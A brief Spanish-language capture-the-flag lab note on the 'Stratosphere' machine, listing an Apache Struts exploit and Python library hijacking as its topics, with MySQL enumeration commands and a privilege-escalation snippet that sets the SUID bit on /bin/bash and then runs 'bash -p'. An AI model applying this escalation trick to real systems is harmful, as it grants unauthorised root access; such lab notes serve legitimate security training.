# Máquina Stratosphere

Máquina de dificultad fácil con los suguientes temas:

* Apache Struts Exploitation (CVE-2017-5638) 
* Python Library Hijacking (Privilege Escalation)

## Comandos/cosas interesantes

### MYSQL

Tener en cuanta la utilidad **mysqlshow** para enumerar.

<pre>
mysqlshow -uadmin -padmin
</pre>

Ejecutar sentencia inline:
<pre>
mysql -uadmin -padmin -c "select * from ..." dbname
</pre>

### PYTHON

#### Permisos de superusuario con privilegios a la consola

<pre>
impor os;
os.system("chmod u+s /bin/bash")
</pre>

Y luego **bash -p**

